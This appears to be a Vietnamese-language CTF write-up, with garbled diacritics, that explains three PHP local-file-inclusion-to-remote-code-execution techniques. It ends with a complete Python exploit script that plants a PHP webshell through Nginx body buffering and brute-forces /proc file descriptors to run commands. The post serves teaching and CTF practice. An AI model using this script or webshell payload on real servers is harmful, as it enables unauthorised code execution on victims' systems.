---
title:  C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó  h·ªïng PHP LFI2RCE
description: M·ªôt v√†i kƒ© thu·∫≠t khai th√°c l·ªó h·ªïng RCE t·ª´ LFI m√† m√¨nh h·ªçc ƒë∆∞·ª£c
author: to^
date: 2022-05-22 20:10:00 +0700
categories: [WebSec, CTF]
tags: [rce, lfi]     # TAG names should always be lowercase
img_path: /assets/img/PHP_LFI2RCE
image:
 src: RCE.jpg
 alt: RCE image
 width: 1000
 height: 400
---

_C√°c kƒ© thu·∫≠t trong b√†i vi·∫øt ƒë·ªÅu c√≥ th·ªÉ gi√∫p khai th√°c l·ªói RCE nh∆∞ng c·∫ßn c√≥  s·ª± tr·ª£ gi√∫p c·ªßa LFI_

## 1. PHP Session File Upload Progress Exploit

ƒê·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c c√°ch khai th√°c n√†y ƒë√≤i h·ªèi m·ªôt v√†i c·∫•u h√¨nh c·ªßa php server, v√¨ v·∫≠y tr∆∞·ªõc ti√™n ta c·∫ßn t√¨m hi·ªÉu v·ªÅ c√°c thi·∫øt l·∫≠p m·∫∑c ƒë·ªãnh trong `php.ini`:


- `session.upload_progress.enabled = on` Khi tr√¨nh duy·ªát upload m·ªôt file l√™n server th√¨ php s·∫Ω l∆∞u th√¥ng tin chi ti·∫øt v·ªÅ file n√†y (ch·∫≥ng h·∫°n upload time, upload
progress, ‚Ä¶) trong session.

- `session.upload_progress.cleanup = on ` Sau khi file upload ho√†n th√†nh, session file s·∫Ω ngay l·∫≠p t·ª©c ƒë∆∞·ª£c x√≥a

- `session.upload_progress.prefix = "upload_progress_"` prefix d√πng v·ªõi upload progress key trong $_SESSION. Key n√†y s·∫Ω ƒë∆∞·ª£c concatenated v·ªõi gi√° tr·ªã c·ªßa `session.upload_progress.name` ƒë·ªÉ cho ra m·ªôt index duy nh·∫•t. Gi√° tr·ªã m·∫∑c ƒë·ªãnh c·ªßa prefix l√†: "upload_progress_"

- `session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"` When it appears in the form, php will report the upload progress. L·ª£i th·∫ø l·ªõn nh·∫•t c·ªßa ta ƒë√≥ l√† gi√° tr·ªã c·ªßa n√≥ c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c.

- `session.auto_start=Off` N·∫øu l√† On th√¨ php s·∫Ω t·ª± ƒë·ªông kh·ªüi t·∫°o session khi nh·∫≠n request v√† kh√¥ng c·∫ßn ph·∫£i th·ª±c thi session_start()

- `session.use_strict_mode=0` Ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c sessionid trong cookie v√† server s·∫Ω t·∫°o session file t∆∞∆°ng ·ª©ng v·ªõi n√≥ ‚Äúsess_sessid‚Äù

_**Session ƒë∆∞·ª£c b·∫Øt ƒë·∫ßu tr√™n php nh∆∞ th·∫ø n√†o?**_

ƒê·ªÉ b·∫Øt ƒë·∫ßu m·ªôt PHP session th√¨ ta c·∫ßn h√†m `session_start()` ho·∫∑c thay ƒë·ªïi gi√° tr·ªã c·ªßa `session.auto_start` trong php.ini th√†nh ON ƒë·ªÉ auto session start
Nh∆∞ng gi√° tr·ªã m·∫∑c ƒë·ªãnh c·ªßa n√≥ l√† OFF v√¨ v·∫≠y kh√≥ c√≥ th·ªÉ khai th√°c l·ªói n√†y.

Ta c√≥ th·ªÉ bypass ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†y n·∫øu ta th√™m 
"PHP_SESSION_UPLOAD_PROGRESS" trong multipart POST data, PHP s·∫Ω enable session cho ch√∫ng ta.

_**Session file ƒë∆∞·ª£c l∆∞u nh∆∞ th·∫ø n√†o ?**_

C√°c file uploaded n√†y s·∫Ω ƒë∆∞·ª£c l∆∞u d·ª±a tr√™n `session.save_path` v√† gi√° tr·ªã n√†y th∆∞·ªùng s·∫Ω ƒë∆∞·ª£c thi·∫øt l·∫≠p m·∫∑c ƒë·ªãnh kh√°c nhau trong c√°c phi√™n b·∫£n c·ªßa php
c√≥ th·ªÉ l√† `/tmp/sess_{sessionid}` ho·∫∑c `/var/lib/php/sessions/sess_{sessionid}`

![1.png](1.png)


_**L√†m sao ƒë·ªÉ  bypass session_upload_progress.cleanup=ON?**_

Nh∆∞ ƒë√£ n√≥i ·ªü tr√™n thi·∫øt l·∫≠p n√†y l√† m·∫∑c ƒë·ªãnh v√† n√≥ s·∫Ω x√≥a t·∫•t c·∫£ progress information ngay khi ho√†n th√†nh qu√° tr√¨nh ƒë·ªçc d·ªØ li·ªáu t·ª´ POST hay c√°c file session c·ªßa ta (ƒë∆∞·ª£c l∆∞u trong `save_path`) s·∫Ω ngay l·∫≠p t·ª©c b·ªã x√≥a.

V√¨ th·∫ø ta c·∫ßn trigger race condition ƒë·ªÉ bypass v·∫•n ƒë·ªÅ n√†y. D∆∞·ªõi ƒë√¢y l√† c√°ch ƒë·ªÉ race:

> You can trigger the race condition by creating custom python script to brute force a session file uploaded, by including session file from local file inclusion vulnerability you found in victim site until the file is catched.
(Extra: If you can see our previous demo, see the last curl on uploading session, I upload /etc/hostname as a file, you can upload large file to trying to slow down the victim site and (hanging) will result a fast race condition and it will be fast than upload small file).
{: .prompt-tip  }

![2.png](2.png)

ƒê·ªÉ ƒë·ªçc n·ªôi dung c·ªßa file n√†y ta d√πng v√≤ng l·∫∑p:
![3.png](3.png)

Ta th·∫•y r·∫±ng gi√° tr·ªã c·ªßa `PHP_SESSION_UPLOAD_PROGRESS` l√† `Abusing PHP_SESION_UPLOAD_PROGRESS` ƒë∆∞·ª£c l∆∞u v√†o file session v·∫≠y n·∫øu ta ch√®n m·ªôt ƒëo·∫°n m√£ php v√† include n√≥ th√¥ng qua LFI th√¨ ƒëi·ªÅu g√¨ s·∫Ω x·∫£y ra ? üòä => RCE

M·ªôt ƒëi·ªÅu c·∫ßn l∆∞u √Ω n·ªØa ·ªü kƒ© thu·∫≠t n√†y ƒë√≥ l√† file session s·∫Ω ch·ª©a nh·ªØng content r√°c n√™n ƒë√¥i khi kh√¥ng th√≠ch h·ª£p cho m·ªôt s·ªë tr∆∞·ªùng h·ª£p.

_Challenge: [one-line-php](https://github.com/to016/CTFs/tree/main/PHP_LFI2RCE_exploit/hitcon-ctf-2018) (hitconctf2018)_

## 2. PHP Temporary File Upload Exploit

PHP engine khi nh·∫≠n ƒë∆∞·ª£c m·ªôt packet POST s·∫Ω t·∫°o ra m·ªôt ho·∫∑c nhi·ªÅu c√°c temporary files ƒë·ªÉ l∆∞u c√°c uploaded file. PHP script x·ª≠ l√≠ c√°c file upload n√†y s·∫Ω d√πng `move_uploaded_file()` ƒë·ªÉ di chuy·ªÉn uploaded temporary file ƒë·∫øn v·ªã tr√≠ mong mu·ªën n·∫øu script c·∫ßn s·ª≠ d·ª•ng ƒë·∫øn file n√†y cho ƒë·∫øn khi ho√†n th√†nh c√¥ng vi·ªác. V√† khi script n√†y ho√†n th√†nh c√¥ng vi·ªác PHP engine s·∫Ω lo·∫°i b·ªè temporary files ·ª©ng v·ªõi files uploaded.

H√¨nh sau l√† timeline c·ªßa qu√° tr√¨nh ƒë·ªÅ c·∫≠p ·ªü tr√™n:

![4.png](4.png)

V√¨ th·∫ø ta c√≥ th·ªÉ upload m·ªôt PHP script v√† t·∫≠n d·ª•ng l·ªói LFI ƒë·ªÉ include temp file n√†y v√†o t·ª´ ƒë√≥ => RCE üòä

Tin t·ªët ·ªü ƒë√¢y l√† PHP script th∆∞·ªùng s·∫Ω access ƒë·∫øn th∆∞ m·ª•c n∆°i m√† temporary files ƒë∆∞·ª£c t·∫°o. Th∆∞ m·ª•c m·∫∑c ƒë·ªãnh th∆∞·ªùng l√† `/tmp` tr√™n linux ho·∫∑c `C:\Windows\Temp` tr√™n windows.

Tin x·∫•u l√† t√™n c·ªßa temp files n√†y l√† random üòû, ƒëi·ªÅu n√†y g√¢y ra s·ª± c·∫£n tr·ªü trong vi·ªác √°p d·ª•ng kƒ© thu·∫≠t n√†y. Tr√™n linux gi√° tr·ªã random n√†y l√† 6 k√≠ t·ª± (A-Za-z0-9) v√† ƒë∆∞·ª£c th√™m v√†o sau "/tmp/php" prefix e.g /tmp/phpUsM123.
B·∫•t l·ª£i ·ªü tr√™n d·∫´n ƒë·∫øn vi·ªác mu·ªën kh√°i th√°c l·ªó h·ªïng n√†y c·∫ßn th·ªèa c√°c gi·∫£ thuy·∫øt:

![Assuming.png](Assuming.png)

B√™n c·∫°nh ƒë√≥ t√°c gi·∫£ c·ªßa b√†i nghi√™n c·ª©u v·ªÅ  kƒ© thu·∫≠t n√†y c√≤n ƒë·ªÅ c·∫≠p v·ªÅ √Ω t∆∞·ªüng c·ªßa h·ªç: 

![Idea.png](Idea.png)

Hmmmm, chung quy l·∫°i th√¨ m·∫•u ch·ªët v·∫´n l√† ph·∫£i t√¨m ƒë∆∞·ª£c t√™n c·ªßa temp file.
V√¥ t√¨nh l∆∞·ªõt qua m·ªôt b√†i vi·∫øt tr√™n hacktricks th√¨ h·ªç c√≥ ƒë·ªÅ c·∫≠p th√™m c√°c ƒëi·ªÅu ki·ªán ƒë·ªÉ h·ªó tr·ª£ khai th√°c cho l·ªói n√†y: `LFI with PHPinfo assistance.`

> To exploit this vulnerability you need: A LFI vulnerability, a page where phpinfo() is displayed, "file_uploads = on" and the server has to be able to write in the "/tmp" directory.
{: .prompt-info  }

ƒê·∫°i kh√°i l√† s·∫Ω c√≥ m·ªôt trang display content c·ªßa phpinfo() t·ª´ ƒë√≥ ta c√≥ th·ªÉ leak ƒë∆∞·ª£c directory ƒë·∫øn temp file v·ª´a upload th√¥ng qua gi√° tr·ªã c·ªßa bi·∫øn `$_FILES`. 

B√™n c·∫°nh ƒë√≥ c√≤n m·ªôt kh√°i ni·ªám li√™n quan l√† PHP output buffering:
> PHP uses a buffer of 4096B and when it is full, it is send to the client. Then the client can send a lot of big requests (using big headers) uploading a php reverse shell, wait for the first part of the phpinfo() to be returned (where the name of the temporary file is) and try to access the temp file before the php server deletes the file exploiting a LFI vulnerability.
{: .prompt-info  }

C√≥ th·ªÉ hi·ªÉu PHP output buffering nh∆∞ sau

![PHPOutputBuffer](PHPOutputBuffer.png)

_Challenge: [easy php](http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/) (n1ctf2018)_

## 3. PHP LFI with Nginx Assistance

Section n√†y n√≥i v·ªÅ kƒ© thu·∫≠t khai th√°c c≈©ng d·ª±a tr√™n LFI nh∆∞ng ƒë·∫∑c bi·ªát h∆°n ·ªü ch·ªó PHP ƒë∆∞·ª£c k·∫øt h·ª£p v·ªõi Nginx server d∆∞·ªõi m·ªôt v√†i c·∫•u h√¨nh ƒë·∫∑c tr∆∞ng.

C√°c kƒ© thu·∫≠t ƒë√£ n√≥i ·ªü tr√™n d·ªÅu d·ª±a v√†o vi·ªác th·ª±c hi·ªán LFI ƒë·ªëi v·ªõi session file ho·∫∑c temp file ƒë·ªÉ RCE. H√£y xem m·ªôt v√≠ d·ª• cho tr∆∞·ªùng h·ª£p c√°c tricks ·ªü tr√™n kh√¥ng th·ªÉ d√πng ƒë∆∞·ª£c:

Source code:

```php
<?php include_once($_GET['file']);
```

FPM / PHP config:
```conf
php_admin_value[session.upload_progress.enabled] = 0
php_admin_value[file_uploads] = 0
```

V√† setup permission ƒë·ªÉ kh√¥ng th·ªÉ include file t·ª´ 2 folder n√†y
```
chown -R 0:0 /tmp /var/tmp /var/lib/php/sessions
chmod -R 000 /tmp /var/tmp /var/lib/php/sessions
```

May m·∫Øn thay, PHP hi·ªán nay th∆∞·ªùng ƒë∆∞·ª£c deployed th√¥ng qua PHP-FPM v√† Nginx. Nginx cung c·∫•p m·ªôt c∆° ch·∫ø  ƒë·ªÉ qu·∫£n l√≠ requests body size g·ªçi l√† [client body buffering](https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size). N·∫øu client body l·ªõn h∆°n m·ªôt gi√° tr·ªã ƒë√£ c·∫•u h√¨nh tr∆∞·ªõc th√¨ s·∫Ω b·∫Øt ƒë·∫ßu t·∫°o ra temporary files v√† ghi v√†o ƒë√≥. V√† t√≠nh nƒÉng n√†y v√¥ t√¨nh l√†m cho LFI2RCE tr·ªü n√™n kh·∫£ thi üò¨.

Temp file n√†y s·∫Ω ƒë∆∞·ª£c x√≥a ngay sau khi ƒë∆∞·ª£c x·ª≠ l√≠ b·ªüi Nginx. Nh∆∞ng ta c√≥ th·ªÉ l·ª£i d·ª•ng `procfs` ƒë·ªÉ tham chi·∫øu n√≥ th√¥ng qua race condition: 

```
/proc/34/fd:
total 0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 0 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -> anon_inode:[eventfd]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -> socket:[27587]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -> socket:[27589]
lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -> socket:[44926]
lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -> socket:[44927]
lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -> /var/lib/nginx/body/0000001368 (deleted)
```

> One cannot directly include /proc/34/fd/15 in this example as PHP's include function would resolve the path to /var/lib/nginx/body/0000001368 (deleted) which doesn't exist in in the filesystem. This minor restriction can luckily be bypassed by some indirection like: /proc/self/fd/34/../../../34/fd/15 which will finally execute the content of the deleted /var/lib/nginx/body/0000001368 file.
{: .prompt-tip  }

_Challenge: a simple [challenge](https://github.com/to016/CTFs/tree/main/PHP_LFI2RCE_exploit/php-lfi-with-nginx-assistance) for approach_

√Ä m·ªôt l∆∞u √Ω n·ªØa ƒë√≥ l√† c√°ch n√†y ch·ªâ d√πng ƒë∆∞·ª£c khi Nginx ch·∫°y v·ªõi c√πng user c·ªßa PHP (th∆∞·ªùng l√† www-data).
L√≠ do th√¨ m√¨nh c√≥ mail h·ªèi t√°c gi·∫£ v√† h·ªç rep nh∆∞ sau:

![rep](rep.png)

script exploit:
```py
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes 
r  = requests.get(URL, params={
    'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'file': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'file': f,
                'c': f'id'
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```
## T√†i li·ªáu tham kh·∫£o

[LFI_With_PHPInfo_Assistance](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)

[What is PHP Output Buffering?](https://notlaura.com/output-buffering/)

[PHP_LFI_rfc1867_temporary_files](https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf)

[File Inclusion/Path traversal - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)

[PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)




